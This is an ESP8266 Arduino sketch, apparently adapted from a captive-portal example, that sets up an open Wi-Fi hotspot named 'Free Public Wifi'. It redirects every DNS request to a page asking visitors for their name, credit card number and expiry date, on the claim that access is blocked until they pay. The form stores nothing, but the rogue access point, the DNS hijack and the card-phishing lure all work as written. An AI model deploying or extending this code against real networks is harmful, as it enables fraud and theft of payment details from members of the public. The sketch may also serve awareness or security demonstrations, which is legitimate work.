/*
   Captive Portal by: M. Ray Burnette 20150831
   See Notes tab for original code references and compile requirements
   Sketch uses 300,640 bytes (69%) of program storage space. Maximum is 434,160 bytes.
   Global variables use 50,732 bytes (61%) of dynamic memory, leaving 31,336 bytes for local variables. Maximum is 81,920 bytes.

   Modified slightly by Alex Jordan to make it look more hackery and print some stuff to the serial console
*/

#include <ESP8266WiFi.h>
#include "./DNSServer.h"                  // Patched lib
#include <ESP8266WebServer.h>

const byte        DNS_PORT = 53;          // Capture DNS requests on port 53
IPAddress         apIP(10, 10, 10, 1);    // Private network for server
DNSServer         dnsServer;              // Create the DNS object
ESP8266WebServer  webServer(80);          // HTTP server

String responseHTML = ""
                      "<!DOCTYPE html><html><head><title>CaptivePortal</title></head><body>"
                      "<h1>Hello World!</h1><p>This is a captive portal example. All requests will "
                      "be redirected here until you pay up.</p>"
                      "<form>"
                      "Name as it appears on card: <input type=\"text\" name=\"name\"><br/>"
                      "Credit card number: <input type=\"text\" name=\"ccn\"><br/>"
                      "Expiration Month: <input type=\"text\" name=\"month\"><br/>"
                      "Expiration Year: <input type=\"text\" name=\"year\"><br/>"
                      "<input type=\"submit\" value=\"Submit\">"
                      "</form>"
                      "</body></html>";


void setup() {
  Serial.begin(9600);
  Serial.println();
  Serial.print("Configuring access point...");
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Free Public Wifi");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });
  webServer.begin();

  Serial.println("HTTP Server started");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
